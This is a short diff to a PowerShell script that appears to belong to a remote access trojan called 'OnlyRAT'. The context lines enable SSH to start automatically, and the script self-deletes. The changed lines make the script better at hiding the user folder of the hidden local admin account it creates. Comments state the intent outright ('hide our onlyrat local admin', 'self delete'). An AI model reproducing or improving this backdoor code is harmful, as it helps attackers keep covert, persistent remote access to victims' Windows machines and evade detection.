@@ -62,7 +62,8 @@ Set-Service -Name sshd -StartupType Automatic
 
 # move to users to hide our onlyrat local admin
 cd C:\Users
-attrib +h +s +r "onlyrat*"
+# attrib +h +s +r "onlyrat*"
+Get-Item -Path "*onlyrat*" -Force|% {attrib +h +s +r $_.FullName}
 
 # navigate to the saved directory and self delete
 cd $fXmtFxsAMdGw
